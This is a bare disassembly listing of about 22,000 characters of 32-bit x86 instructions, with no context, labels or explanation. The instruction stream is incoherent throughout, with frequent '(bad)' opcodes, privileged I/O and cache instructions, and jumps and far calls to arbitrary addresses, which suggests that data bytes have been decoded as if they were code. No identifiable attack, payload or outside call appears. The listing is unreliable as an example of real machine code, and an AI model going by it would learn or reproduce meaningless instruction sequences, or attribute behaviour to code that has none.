  41b33e:	xchg   DWORD PTR [eax-0x34],ebp
  41b341:	push   ds
  41b342:	dec    ebp
  41b343:	mov    bl,0x1b
  41b345:	pop    eax
  41b346:	push   esp
  41b347:	repz mov dl,0x60
  41b34a:	lock push esi
  41b34c:	inc    edx
  41b34d:	push   ss
  41b34e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b34f:	fs das 
  41b351:	xor    DWORD PTR [edi-0x5e],eax
  41b354:	add    bl,BYTE PTR [esi+eiz*1+0x4b]
  41b358:	outs   dx,DWORD PTR ds:[esi]
  41b359:	(bad)  
  41b35b:	enter  0xa393,0xfd
  41b35f:	sbb    ebx,ecx
  41b361:	adc    bh,BYTE PTR [edx+0x43]
  41b364:	fwait
  41b365:	mov    ah,0xb4
  41b367:	sbb    edx,eax
  41b369:	test   al,0x6e
  41b36b:	or     DWORD PTR [eax-0x46],esi
  41b36e:	stc    
  41b36f:	and    BYTE PTR [ecx+esi*8+0x5a6f5810],0x73
  41b377:	pusha  
  41b378:	call   0x5e41d4ec
  41b37d:	mov    ds:0x9f1bf512,eax
  41b382:	inc    BYTE PTR [ecx+eiz*1-0x7ada0090]
  41b389:	inc    esp
  41b38a:	pop    ebp
  41b38b:	ret    
  41b38c:	rcl    BYTE PTR [ebx],0x15
  41b38f:	(bad)  
  41b390:	pop    ebx
  41b391:	jno    0x41b3c2
  41b393:	xor    al,0x8d
  41b395:	adc    eax,DWORD PTR [ecx-0x6c]
  41b398:	add    DWORD PTR [edx+0xffe3c27],edi
  41b39e:	lock jnp 0x41b34a
  41b3a1:	retf   0xce0b
  41b3a4:	loopne 0x41b3ad
  41b3a6:	out    dx,al
  41b3a7:	jnp    0x41b32b
  41b3a9:	shl    DWORD PTR [eax-0x70],1
  41b3ac:	adc    eax,DWORD PTR [esp+edi*2-0x4e]
  41b3b0:	(bad)  
  41b3b1:	imul   BYTE PTR [eax-0x23aa6e64]
  41b3b7:	and    ebp,DWORD PTR [eax-0x63267c5]
  41b3bd:	pop    edi
  41b3be:	inc    esp
  41b3bf:	dec    edi
  41b3c0:	inc    esp
  41b3c1:	pop    ss
  41b3c2:	or     al,0x59
  41b3c4:	std    
  41b3c5:	xlat   BYTE PTR ds:[ebx]
  41b3c6:	mov    ebx,0xef633ede
  41b3cb:	add    ebx,DWORD PTR [ebp+edx*1+0x41762245]
  41b3d2:	nop
  41b3d3:	adc    eax,0x5d2bfd28
  41b3d8:	ins    BYTE PTR es:[edi],dx
  41b3d9:	xchg   esi,eax
  41b3da:	mov    cl,BYTE PTR [eax+0xaf2d1c2]
  41b3e0:	mov    ds,esp
  41b3e2:	or     ch,BYTE PTR ds:0xd9c46f95
  41b3e8:	jmp    0x63fc148f
  41b3ed:	std    
  41b3ee:	in     eax,dx
  41b3ef:	leave  
  41b3f0:	stos   BYTE PTR es:[edi],al
  41b3f1:	jp     0x41b3bc
  41b3f3:	dec    esp
  41b3f4:	xchg   ebx,eax
  41b3f5:	or     al,0xa3
  41b3f7:	mov    ebp,0xe85ad861
  41b3fc:	xor    eax,0xde6a7486
  41b401:	int    0x2c
  41b403:	je     0x41b400
  41b405:	push   ss
  41b406:	rcl    BYTE PTR [ebp+0x14],1
  41b409:	aaa    
  41b40a:	jns    0x41b3ba
  41b40c:	dec    ecx
  41b40d:	push   0xffffff8b
  41b40f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b410:	shl    BYTE PTR [esp],1
  41b413:	sub    eax,0x87062c73
  41b418:	mov    DWORD PTR [esi-0x2c3d620a],esi
  41b41e:	cmp    al,0x56
  41b420:	dec    edx
  41b421:	cmp    eax,DWORD PTR [edi]
  41b423:	pusha  
  41b424:	pxor   mm7,QWORD PTR [edx-0x9bb804a]
  41b42b:	aam    0x5b
  41b42d:	clc    
  41b42e:	sbb    ch,BYTE PTR [esi-0x151ee550]
  41b434:	icebp  
  41b435:	fsubr  QWORD PTR [ecx-0x3fb69d52]
  41b43b:	xchg   DWORD PTR ds:[ebx+0x2ef4ac5b],esp
  41b442:	add    al,0x1
  41b444:	push   esi
  41b445:	outs   dx,BYTE PTR ds:[esi]
  41b446:	sahf   
  41b447:	mov    WORD PTR [edx+0x1e6e4c56],?
  41b44d:	inc    eax
  41b44e:	mov    bh,0xe3
  41b450:	retf   0x6589
  41b453:	test   cl,bh
  41b455:	or     ah,bl
  41b457:	in     al,0x7a
  41b459:	shr    bl,cl
  41b45b:	sub    eax,0xe8da0d49
  41b460:	pop    esp
  41b461:	xchg   edx,eax
  41b462:	xor    esi,DWORD PTR [eax]
  41b464:	sar    ebp,cl
  41b466:	or     BYTE PTR [ecx+0x5ab88b90],cl
  41b46c:	mov    ch,0x95
  41b46e:	or     eax,0xc7dc3575
  41b473:	loopne 0x41b48a
  41b475:	out    dx,al
  41b476:	sub    bl,BYTE PTR [edi]
  41b478:	test   DWORD PTR [eax-0x3c],ebp
  41b47b:	int3   
  41b47c:	inc    esp
  41b47d:	stc    
  41b47e:	dec    esi
  41b47f:	mov    ebx,eax
  41b481:	and    esi,ebp
  41b483:	jge    0x41b426
  41b485:	mov    ebx,0xfe7a6b61
  41b48a:	dec    ecx
  41b48b:	ja     0x41b44d
  41b48d:	xchg   ebx,eax
  41b48e:	jo     0x41b439
  41b490:	or     ah,BYTE PTR [ecx+0x79f3d0b8]
  41b496:	fisub  WORD PTR [esp+eiz*4]
  41b499:	rcr    BYTE PTR [ebx-0x4b46ba46],cl
  41b49f:	addr16 pop esi
  41b4a1:	push   0xffffffc2
  41b4a3:	mov    al,0xdc
  41b4a5:	push   eax
  41b4a6:	out    dx,al
  41b4a7:	iret   
  41b4a8:	mov    edx,0x9dadc32c
  41b4ad:	jg     0x41b496
  41b4af:	or     BYTE PTR [eax+ebp*4+0x52],dh
  41b4b3:	cli    
  41b4b4:	dec    eax
  41b4b5:	add    ebx,DWORD PTR ds:0x9ced1123
  41b4bb:	sbb    bl,BYTE PTR [edx-0x74]
  41b4be:	icebp  
  41b4bf:	stc    
  41b4c0:	aam    0xa9
  41b4c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4c3:	or     al,0x6b
  41b4c5:	push   es
  41b4c6:	dec    edx
  41b4c7:	xchg   esi,eax
  41b4c8:	add    al,0x92
  41b4ca:	fs push eax
  41b4cc:	fisttp WORD PTR [edi+edx*8]
  41b4cf:	cmp    dl,BYTE PTR [ebx+0x54]
  41b4d2:	xchg   esi,eax
  41b4d3:	mov    cl,0x6b
  41b4d5:	(bad)  
  41b4d6:	aaa    
  41b4d7:	push   ds
  41b4d8:	call   0x200a4452
  41b4dd:	jne    0x41b505
  41b4df:	es loop 0x41b519
  41b4e2:	jmp    DWORD PTR [ebx]
  41b4e4:	pop    ss
  41b4e5:	arpl   WORD PTR [edi-0x31],dx
  41b4e8:	cmp    BYTE PTR gs:[edx-0x1f7d2f2e],0xdb
  41b4f0:	mov    eax,edi
  41b4f2:	retf   0xc4e9
  41b4f5:	mov    ah,0xbe
  41b4f7:	test   edx,ebp
  41b4f9:	sti    
  41b4fa:	cmp    eax,0x94a083b6
  41b4ff:	fcom   DWORD PTR [esi-0x1841e15d]
  41b505:	push   ds
  41b506:	mov    edx,DWORD PTR [ebx]
  41b508:	jo     0x41b49a
  41b50a:	addr16 mov eax,0xa0f0aa72
  41b510:	sbb    eax,0x214a97e4
  41b515:	out    dx,al
  41b516:	ins    BYTE PTR es:[edi],dx
  41b517:	int3   
  41b518:	mov    DWORD PTR [edi-0x52],esi
  41b51b:	sub    eax,0x62efd5ac
  41b520:	(bad)  
  41b522:	jns    0x41b4d2
  41b524:	pushf  
  41b525:	mov    ebp,0x55e9d31c
  41b52a:	in     al,dx
  41b52b:	cmp    ah,BYTE PTR [ebx-0x4c]
  41b52e:	daa    
  41b52f:	repz call 0x37efc3f3
  41b535:	dec    edi
  41b536:	adc    eax,0xeea1498c
  41b53b:	mov    ecx,0xe27bb2e2
  41b540:	retf   
  41b541:	cmp    bl,bl
  41b543:	in     al,0xb1
  41b545:	xor    edi,DWORD PTR [esi-0x4ab296e1]
  41b54b:	jl     0x41b56b
  41b54d:	mov    esp,ecx
  41b54f:	daa    
  41b550:	push   ecx
  41b551:	outs   dx,BYTE PTR ds:[esi]
  41b552:	jne    0x41b513
  41b554:	(bad)  
  41b555:	mov    BYTE PTR [edx+0x3df967bf],ch
  41b55b:	cmp    bl,ch
  41b55d:	ins    DWORD PTR es:[edi],dx
  41b55e:	fcmovnbe st,st(7)
  41b560:	xor    edx,DWORD PTR [edx+0x7c45c84e]
  41b566:	xchg   edx,eax
  41b567:	pop    ebp
  41b568:	cmp    al,0x61
  41b56a:	idiv   esp
  41b56c:	outs   dx,BYTE PTR ds:[esi]
  41b56d:	push   edx
  41b56e:	imul   eax,esp,0x25
  41b571:	mov    eax,0x76dc64d
  41b576:	sub    DWORD PTR [edx-0x11cc9b91],edi
  41b57c:	or     DWORD PTR [ebp-0x23c14b8a],edx
  41b582:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b583:	push   eax
  41b584:	pop    edx
  41b585:	jecxz  0x41b551
  41b587:	add    eax,ebx
  41b589:	hlt    
  41b58a:	or     DWORD PTR [ecx+0x36b5db0d],0x20
  41b591:	mov    WORD PTR [ebp-0x4a5cb9e6],gs
  41b597:	sbb    al,0xd8
  41b599:	cld    
  41b59a:	dec    edx
  41b59b:	ins    BYTE PTR es:[edi],dx
  41b59c:	retf   0x88d3
  41b59f:	shl    BYTE PTR [edi+ecx*4],1
  41b5a2:	out    dx,al
  41b5a3:	sbb    BYTE PTR [edx],dh
  41b5a5:	in     eax,dx
  41b5a6:	rol    BYTE PTR [ecx+0x6bb789bb],0xd
  41b5ad:	push   esp
  41b5ae:	outs   dx,DWORD PTR ds:[esi]
  41b5af:	mov    ecx,0xc6b98bf1
  41b5b4:	pusha  
  41b5b5:	outs   dx,DWORD PTR ds:[esi]
  41b5b6:	adc    DWORD PTR [eax],0x43
  41b5b9:	in     eax,dx
  41b5ba:	sbb    eax,0x8f76f401
  41b5bf:	fidiv  DWORD PTR [edi-0x7b5c8391]
  41b5c5:	loope  0x41b5f8
  41b5c7:	xor    esp,esp
  41b5c9:	xor    BYTE PTR [ecx+0x4dc3a6fe],al
  41b5cf:	imul   edi,DWORD PTR [edi-0x3],0xc4d7263f
  41b5d6:	gs dec edi
  41b5d8:	loop   0x41b616
  41b5da:	imul   esi,DWORD PTR [esi-0x1e],0xaef36f24
  41b5e1:	sub    al,0x74
  41b5e3:	ja     0x41b632
  41b5e5:	pop    eax
  41b5e6:	jnp    0x41b574
  41b5e8:	xchg   DWORD PTR [esi-0x1e4d4351],ecx
  41b5ee:	lods   al,BYTE PTR ds:[esi]
  41b5ef:	mov    ebp,0x98c6927d
  41b5f4:	popf   
  41b5f5:	dec    esi
  41b5f6:	mov    al,ds:0xea23fe99
  41b5fb:	add    eax,0xde78464b
  41b600:	aad    0x19
  41b602:	mov    edi,0x3f8b14a5
  41b607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b608:	pushf  
  41b609:	popa   
  41b60a:	mov    dl,0xa3
  41b60c:	test   BYTE PTR [ebp-0x474ecfd2],cl
  41b612:	or     eax,0xbcae216f
  41b617:	add    DWORD PTR [edx-0x74],eax
  41b61a:	leave  
  41b61b:	xchg   ecx,eax
  41b61c:	lahf   
  41b61d:	jmp    0x41b611
  41b61f:	lea    ecx,[esi-0x7f8a1ac2]
  41b625:	les    eax,FWORD PTR [eax+0x1d1ca31c]
  41b62b:	lds    edx,FWORD PTR [edi+0x38]
  41b62e:	cmp    BYTE PTR [edx+0x3f],0xdb
  41b632:	fstp   DWORD PTR [edi]
  41b634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b635:	retf   0x8e4b
  41b638:	fnsave [esp+esi*4]
  41b63b:	jmp    0x85983c30
  41b640:	inc    edi
  41b641:	mov    ch,0xe5
  41b643:	add    al,0x6b
  41b645:	ret    
  41b646:	adc    BYTE PTR [edi],bh
  41b648:	lock mov DWORD PTR [eax],ebx
  41b64b:	ss sahf 
  41b64d:	jbe    0x41b624
  41b64f:	aaa    
  41b650:	fild   QWORD PTR [esi-0x6d08c13]
  41b656:	sbb    al,0x93
  41b658:	pop    ecx
  41b659:	pop    ebx
  41b65a:	mov    dh,0x92
  41b65c:	or     ebp,DWORD PTR [edi]
  41b65e:	xchg   edi,eax
  41b65f:	mov    al,ds:0x29a92210
  41b664:	mov    ch,0x9b
  41b666:	test   DWORD PTR [ecx],ebp
  41b668:	rcl    DWORD PTR [edx-0x4faac671],0x2e
  41b66f:	ins    BYTE PTR es:[edi],dx
  41b670:	test   eax,0xb11fe2ff
  41b675:	idiv   BYTE PTR [edx+0x72]
  41b678:	ja     0x41b69c
  41b67a:	leave  
  41b67b:	mov    ah,0x4e
  41b67d:	sub    BYTE PTR [ebx],al
  41b67f:	mov    dl,0x5a
  41b681:	mov    ebp,eax
  41b683:	xchg   ebx,eax
  41b684:	(bad)  
  41b686:	push   esi
  41b687:	ror    esi,1
  41b689:	(bad)  
  41b68b:	cmc    
  41b68c:	test   DWORD PTR [ecx-0x23],0x273e1d88
  41b693:	cmp    BYTE PTR [eax],0x87
  41b696:	push   eax
  41b697:	mov    cl,dh
  41b699:	xchg   esp,eax
  41b69a:	pop    eax
  41b69b:	call   0x152d:0x8469111c
  41b6a2:	aaa    
  41b6a3:	xchg   ebx,eax
  41b6a4:	inc    ecx
  41b6a5:	inc    ebp
  41b6a6:	(bad)
  41b6a9:	sub    bl,ah
  41b6ab:	inc    ecx
  41b6ac:	pop    esi
  41b6ad:	(bad)  
  41b6ae:	and    BYTE PTR cs:[esp+ebp*8],dh
  41b6b2:	sub    edi,DWORD PTR [edi+ebp*4-0x54f8c60e]
  41b6b9:	loope  0x41b682
  41b6bb:	fist   WORD PTR [ebx-0x56]
  41b6be:	stos   BYTE PTR es:[edi],al
  41b6bf:	test   al,al
  41b6c1:	rol    DWORD PTR [eax-0x1fd20ca0],1
  41b6c7:	ins    BYTE PTR es:[edi],dx
  41b6c8:	mov    ebp,0xea144fb3
  41b6cd:	les    esp,FWORD PTR ds:0xeb8e1e93
  41b6d3:	stos   BYTE PTR es:[edi],al
  41b6d4:	mov    dl,0xb2
  41b6d6:	pop    es
  41b6d7:	das    
  41b6d8:	add    DWORD PTR [eax+0x7f29b1a3],eax
  41b6de:	sbb    bh,ah
  41b6e0:	scas   al,BYTE PTR es:[edi]
  41b6e1:	cmp    al,0xcf
  41b6e3:	inc    esp
  41b6e4:	adc    ecx,0x80f5d80e
  41b6ea:	inc    ebx
  41b6eb:	enter  0x8ef5,0x19
  41b6ef:	pop    ss
  41b6f0:	sti    
  41b6f1:	in     eax,dx
  41b6f2:	cmp    cl,BYTE PTR [edi-0x56d41a64]
  41b6f8:	mov    WORD PTR [edi+0x65],?
  41b6fb:	mov    edx,0xf93226f
  41b700:	xchg   ecx,eax
  41b701:	and    ch,bh
  41b703:	rcr    DWORD PTR [edi-0x6b],1
  41b706:	(bad)  
  41b707:	in     al,0xe
  41b709:	cli    
  41b70a:	mov    ebp,0x24579cd3
  41b70f:	jl     0x41b6aa
  41b711:	aam    0x67
  41b713:	mov    dl,0x7d
  41b715:	icebp  
  41b716:	pop    DWORD PTR [eax+0x51]
  41b719:	arpl   sp,si
  41b71b:	sbb    ebx,DWORD PTR [eax+0x61]
  41b71e:	test   BYTE PTR [ebp-0x5a927a4b],bh
  41b724:	pop    edi
  41b725:	add    DWORD PTR [edx+0x51],esi
  41b728:	mov    ecx,0x1e454e70
  41b72d:	mov    edi,0x2728211d
  41b732:	loopne 0x41b754
  41b734:	daa    
  41b735:	inc    eax
  41b736:	push   es
  41b737:	shl    BYTE PTR [ecx],1
  41b739:	jb     0x41b77b
  41b73b:	in     al,0x96
  41b73d:	jmp    0x31958e7c
  41b742:	cld    
  41b743:	pop    edi
  41b744:	rol    ebp,0x47
  41b747:	stc    
  41b748:	bnd jns 0x41b744
  41b74b:	fisttp DWORD PTR [ecx+0x66]
  41b74e:	popf   
  41b74f:	add    DWORD PTR [ecx+0x32560270],0x53
  41b756:	pop    ebx
  41b757:	out    dx,al
  41b758:	sub    eax,0x5783a1ba
  41b75d:	sub    DWORD PTR [ecx+0xccbf474],esp
  41b763:	or     al,0x7a
  41b765:	cs push ecx
  41b767:	cmp    al,0x95
  41b769:	pop    esi
  41b76a:	(bad)  
  41b76b:	js     0x41b7a4
  41b76d:	sub    DWORD PTR [ebx+0x66],esp
  41b770:	mov    ah,0x13
  41b772:	mov    ebp,0x770df63a
  41b777:	xlat   BYTE PTR ds:[ebx]
  41b778:	nop
  41b779:	jb     0x41b759
  41b77b:	cmovae eax,DWORD PTR [esi+0x25]
  41b77f:	xchg   ecx,eax
  41b780:	rol    dl,cl
  41b782:	test   BYTE PTR [edi-0x79],bh
  41b785:	jmp    0xf9ed:0x4f858aed
  41b78c:	sti    
  41b78d:	aad    0xc3
  41b78f:	out    dx,al
  41b790:	loop   0x41b719
  41b792:	add    esi,DWORD PTR [edi-0x31fc16f3]
  41b798:	sub    eax,0x8a8584c8
  41b79d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b79e:	pop    edi
  41b79f:	sahf   
  41b7a0:	jns    0x41b81f
  41b7a2:	jecxz  0x41b780
  41b7a4:	and    eax,0xf726d52c
  41b7a9:	mov    gs,WORD PTR [eax+ecx*8]
  41b7ac:	pop    ebp
  41b7ad:	aam    0x7d
  41b7af:	aaa    
  41b7b0:	and    eax,0x58877b99
  41b7b5:	xchg   BYTE PTR [ecx+0x6e868617],al
  41b7bb:	dec    edi
  41b7bc:	mov    ah,0x69
  41b7be:	inc    esi
  41b7bf:	pop    ebp
  41b7c0:	dec    ecx
  41b7c1:	repz push ecx
  41b7c3:	xchg   ebx,eax
  41b7c4:	ja     0x41b7d6
  41b7c6:	retf   
  41b7c7:	mov    DWORD PTR [edi-0x9],esi
  41b7ca:	and    eax,0x5cd58107
  41b7cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7d0:	adc    DWORD PTR [edi+0x3c],eax
  41b7d3:	leave  
  41b7d4:	add    bl,bh
  41b7d6:	inc    ebp
  41b7d7:	jle    0x41b76e
  41b7d9:	rcl    DWORD PTR [eax-0x161e3c34],1
  41b7df:	daa    
  41b7e0:	and    al,0x21
  41b7e2:	fwait
  41b7e3:	xlat   BYTE PTR ds:[ebx]
  41b7e4:	sbb    ebx,ecx
  41b7e6:	push   ss
  41b7e7:	mov    al,ds:0xef231d76
  41b7ec:	iret   
  41b7ed:	mov    cl,0x3b
  41b7ef:	bound  esi,QWORD PTR ds:0xe1b48815
  41b7f5:	mov    esp,0x6a6059b3
  41b7fa:	and    DWORD PTR [edx+eax*1+0x5d135221],esp
  41b801:	test   BYTE PTR [esi],cl
  41b803:	sahf   
  41b804:	in     eax,dx
  41b805:	xchg   edx,eax
  41b806:	loope  0x41b799
  41b808:	sbb    eax,0x2303f2a8
  41b80d:	jae    0x41b847
  41b80f:	leave  
  41b810:	(bad)  
  41b811:	aad    0xe
  41b813:	sbb    al,0x66
  41b815:	cwde   
  41b816:	inc    edi
  41b817:	(bad)  
  41b818:	daa    
  41b819:	int3   
  41b81a:	push   0xfffffff4
  41b81c:	enter  0xbc06,0x54
  41b820:	sub    BYTE PTR [ebp+0x8370ef],0x68
  41b827:	stc    
  41b828:	in     eax,0x9d
  41b82a:	jne    0x41b898
  41b82c:	mov    bl,0xcd
  41b82e:	dec    ebp
  41b82f:	sbb    eax,0xe2dcec7e
  41b834:	into   
  41b835:	pusha  
  41b836:	(bad)  
  41b837:	mov    ah,0xf6
  41b839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b83a:	fwait
  41b83b:	jmp    FWORD PTR [edx]
  41b83d:	(bad)  
  41b83e:	iret   
  41b83f:	mov    WORD PTR [esi],ds
  41b841:	leave  
  41b842:	test   esp,ecx
  41b844:	sub    cl,ch
  41b846:	(bad)  
  41b847:	enter  0xb9fe,0x6c
  41b84b:	cmp    al,0xdd
  41b84d:	dec    edi
  41b84f:	mov    ebp,ebx
  41b851:	and    eax,0xe588d7a8
  41b856:	sub    bh,BYTE PTR [ecx-0x27]
  41b859:	mov    edx,0x76c74c9e
  41b85e:	sbb    esp,DWORD PTR [ebx-0x6b]
  41b861:	cld    
  41b862:	mov    edi,0xaa4eb712
  41b867:	xchg   ecx,eax
  41b868:	mov    ds:0xfbef1241,al
  41b86d:	dec    esp
  41b86e:	push   cs
  41b86f:	in     eax,0x33
  41b871:	mov    eax,0xdb95cf7b
  41b876:	and    DWORD PTR [esi+0x44],0x4655da67
  41b87d:	inc    esi
  41b87e:	pshufw mm7,QWORD PTR [ebx],0x9a
  41b882:	mov    eax,0xb8966031
  41b887:	mov    ds:0xa7e07332,eax
  41b88c:	sbb    DWORD PTR [edx],0x30
  41b88f:	xor    DWORD PTR [ecx],esi
  41b891:	out    0x2e,eax
  41b893:	jecxz  0x41b8cf
  41b895:	aas    
  41b896:	xor    al,0xc7
  41b898:	lods   eax,DWORD PTR ds:[esi]
  41b899:	add    ebx,edx
  41b89b:	push   esp
  41b89c:	push   ss
  41b89d:	cmp    eax,esp
  41b89f:	cmp    eax,0xa626fe8d
  41b8a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8a5:	retf   
  41b8a6:	femms  
  41b8a8:	jb     0x41b8dc
  41b8aa:	out    dx,eax
  41b8ab:	in     eax,dx
  41b8ac:	jne    0x41b89c
  41b8ae:	jmp    DWORD PTR [ebp+0x20]
  41b8b1:	dec    ebp
  41b8b2:	invd   
  41b8b4:	mov    bl,0x3e
  41b8b6:	not    BYTE PTR [ebx-0x70e17cd0]
  41b8bc:	inc    eax
  41b8bd:	pop    ebx
  41b8be:	je     0x41b8a4
  41b8c0:	scas   eax,DWORD PTR es:[edi]
  41b8c1:	dec    esi
  41b8c2:	push   ebx
  41b8c3:	scas   al,BYTE PTR es:[edi]
  41b8c4:	cmp    bl,bl
  41b8c6:	bound  ebp,QWORD PTR [edi+edx*4]
  41b8c9:	sbb    al,0x91
  41b8cb:	adc    eax,0x65777cda
  41b8d0:	jns    0x41b92c
  41b8d2:	push   ds
  41b8d3:	mov    eax,ds:0xd7457816
  41b8d8:	pushf  
  41b8d9:	push   edi
  41b8da:	cmp    eax,0x9e6a0571
  41b8df:	pop    ebp
  41b8e0:	bound  ebx,QWORD PTR [ecx]
  41b8e2:	fadd   DWORD PTR ds:0x12e177f0
  41b8e8:	push   edx
  41b8e9:	iret   
  41b8ea:	loop   0x41b8e6
  41b8ec:	(bad)  
  41b8ed:	iret   
  41b8ee:	(bad)  
  41b8ef:	xor    eax,0xa586b3f0
  41b8f4:	push   cs
  41b8f5:	push   cs
  41b8f6:	adc    ch,al
  41b8f8:	xchg   eax,eax
  41b8fa:	into   
  41b8fb:	aaa    
  41b8fc:	test   BYTE PTR [edi],dh
  41b8fe:	jg     0x41b907
  41b900:	jne    0x41b8cf
  41b902:	hlt    
  41b903:	sbb    cl,BYTE PTR [ecx-0x73]
  41b906:	fidivr WORD PTR cs:[edi]
  41b909:	les    ebp,FWORD PTR [edi-0x47]
  41b90c:	and    BYTE PTR [edx-0x46],dl
  41b90f:	stos   BYTE PTR es:[edi],al
  41b910:	lock jg 0x41b8c7
  41b913:	cli    
  41b914:	cdq    
  41b915:	fbstp  TBYTE PTR [ebx]
  41b917:	adc    eax,0x95f33ce9
  41b91c:	aad    0xc1
  41b91e:	int3   
  41b91f:	jno    0x41b8a5
  41b921:	or     DWORD PTR [esi],edx
  41b923:	ret    
  41b924:	add    dl,al
  41b926:	jns    0x41b929
  41b928:	out    0x1f,eax
  41b92a:	push   eax
  41b92b:	mov    eax,ds:0x4124b19f
  41b930:	lea    ebx,[ebp+ebp*2-0x6a]
  41b934:	and    al,0x1
  41b936:	iret   
  41b937:	(bad)  
  41b938:	xchg   ebx,eax
  41b939:	add    dh,al
  41b93b:	mov    bh,0xf4
  41b93d:	xor    eax,0x31c2f883
  41b942:	sbb    ecx,ebp
  41b944:	push   0x49
  41b946:	mov    dh,0xd3
  41b948:	dec    ebp
  41b949:	adc    esp,eax
  41b94b:	sbb    BYTE PTR [ebx+eax*1],ch
  41b94e:	lods   eax,DWORD PTR ds:[esi]
  41b94f:	cmp    DWORD PTR [eax],esp
  41b951:	pop    ebx
  41b952:	(bad)  
  41b953:	and    eax,0xcac83ac4
  41b958:	or     ebx,DWORD PTR [edx+edx*2+0x2156880a]
  41b95f:	popf   
  41b960:	dec    esp
  41b961:	inc    esp
  41b962:	or     eax,0xab349a64
  41b967:	jne    0x41b924
  41b969:	les    edi,FWORD PTR [ebp+0x65]
  41b96c:	fcmovb st,st(3)
  41b96e:	inc    eax
  41b96f:	into   
  41b970:	(bad)  
  41b972:	cmp    cx,WORD PTR [ebp+0x12]
  41b976:	stos   BYTE PTR es:[edi],al
  41b977:	out    dx,ax
  41b979:	sub    esi,DWORD PTR [ebp+0x3f]
  41b97c:	lock inc ebx
  41b97e:	mov    ds:0x35e6e7ad,eax
  41b983:	mov    eax,0xb90fc7a5
  41b988:	sub    BYTE PTR [eax-0xa],cl
  41b98b:	ds xchg ebp,eax
  41b98d:	popa   
  41b98e:	retf   0x31c5
  41b991:	jae    0x41b9e4
  41b993:	pop    ebp
  41b994:	xchg   edi,eax
  41b995:	hlt    
  41b996:	nop
  41b997:	das    
  41b998:	pop    ecx
  41b999:	xchg   BYTE PTR [ecx+0x60f234bc],cl
  41b99f:	stos   BYTE PTR es:[edi],al
  41b9a0:	mov    eax,es:0xdc8bd720
  41b9a6:	shl    ch,1
  41b9a8:	xchg   edx,eax
  41b9a9:	imul   ebx,DWORD PTR [ebx],0xff8447dd
  41b9af:	test   DWORD PTR [edi-0x792066b4],edx
  41b9b5:	ja     0x41ba03
  41b9b7:	jno    0x41b9aa
  41b9b9:	ficom  WORD PTR [eax+0x78]
  41b9bc:	mov    ah,0x48
  41b9be:	sbb    bl,bh
  41b9c0:	inc    eax
  41b9c1:	xchg   ebx,eax
  41b9c2:	xchg   DWORD PTR [edx+0x35],esi
  41b9c5:	adc    eax,DWORD PTR [ecx+esi*8+0x65a7a847]
  41b9cc:	retf   0x799b
  41b9cf:	jg     0x41ba06
  41b9d1:	int3   
  41b9d2:	popa   
  41b9d3:	retf   0x5474
  41b9d6:	jle    0x41b9c7
  41b9d8:	sbb    al,BYTE PTR [eax+edx*8+0x42]
  41b9dc:	ss cli 
  41b9de:	test   eax,0x2e0a887b
  41b9e3:	sbb    dh,BYTE PTR [esi+0x15]
  41b9e6:	dec    edi
  41b9e7:	jbe    0x41b98b
  41b9e9:	jno    0x41b9ae
  41b9eb:	(bad)  
  41b9ec:	inc    edx
  41b9ed:	clc    
  41b9ee:	pop    ebp
  41b9ef:	pop    esp
  41b9f0:	hlt    
  41b9f1:	call   0xa12ad4ad
  41b9f6:	sub    ch,BYTE PTR [ebx+0x82a14d1]
  41b9fc:	or     ch,BYTE PTR [ebp-0x2e]
  41b9ff:	daa    
  41ba00:	outs   dx,BYTE PTR ds:[esi]
  41ba01:	pop    esi
  41ba02:	stos   DWORD PTR es:[edi],eax
  41ba03:	and    DWORD PTR [ebp-0x2dc509f3],ebx
  41ba09:	fdiv   st,st(3)
  41ba0b:	repz out dx,al
  41ba0d:	ret    
  41ba0e:	xchg   ebp,eax
  41ba0f:	pop    ss
  41ba10:	cld    
  41ba11:	xchg   edi,eax
  41ba12:	push   edi
  41ba13:	sbb    BYTE PTR [ecx+ecx*2-0x76],cl
  41ba17:	retf   0x32a3
  41ba1a:	cdq    
  41ba1b:	xor    bl,bh
  41ba1d:	xor    DWORD PTR [esi],edi
  41ba1f:	int3   
  41ba20:	or     al,0x6b
  41ba22:	test   al,0x7b
  41ba24:	mov    BYTE PTR [edi-0x66],bh
  41ba27:	jno    0x41b9d8
  41ba29:	nop
  41ba2a:	or     eax,0xbfc47d9a
  41ba2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba30:	pusha  
  41ba31:	cmp    bh,bl
  41ba33:	push   ecx
  41ba34:	mov    eax,ds:0x5d90a457
  41ba39:	imul   esi,DWORD PTR [ebp+0x4abcdab4],0xca920c76
  41ba43:	xchg   ebp,eax
  41ba44:	sbb    esp,DWORD PTR [eax-0x521189fc]
  41ba4a:	and    DWORD PTR [ecx+esi*8+0x6],edx
  41ba4e:	shr    esi,0x6b
  41ba51:	test   BYTE PTR [ecx+0x2e9c847e],0x7
  41ba58:	scas   eax,DWORD PTR es:[edi]
  41ba59:	dec    edx
  41ba5a:	fnsave [ebp+0x5e]
  41ba5d:	pop    ds
  41ba5e:	cmc    
  41ba5f:	adc    BYTE PTR [edx+0x38c95f1e],cl
  41ba65:	rcr    DWORD PTR [eax],0x58
  41ba68:	pop    ss
  41ba69:	xor    al,0x57
  41ba6b:	aas    
  41ba6c:	(bad)  
  41ba6d:	sub    eax,0xe3008739
  41ba72:	push   cs
  41ba73:	and    al,0xd5
  41ba75:	cwde   
  41ba76:	cli    
  41ba77:	out    dx,al
  41ba78:	mov    bl,0xd2
  41ba7a:	push   eax
  41ba7b:	(bad)  
  41ba7c:	cmp    ah,BYTE PTR [eax*4+0x34567bbd]
  41ba83:	retf   0x5453
  41ba86:	sub    ecx,DWORD PTR es:[eax-0x73676f10]
  41ba8d:	leave  
  41ba8e:	rol    DWORD PTR [ebp-0x30],cl
  41ba91:	xor    DWORD PTR [edx],edx
  41ba93:	out    dx,al
  41ba94:	sub    cl,BYTE PTR [edi+0x4a]
  41ba97:	icebp  
  41ba98:	pop    ebp
  41ba99:	stos   DWORD PTR es:[edi],eax
  41ba9a:	push   ebp
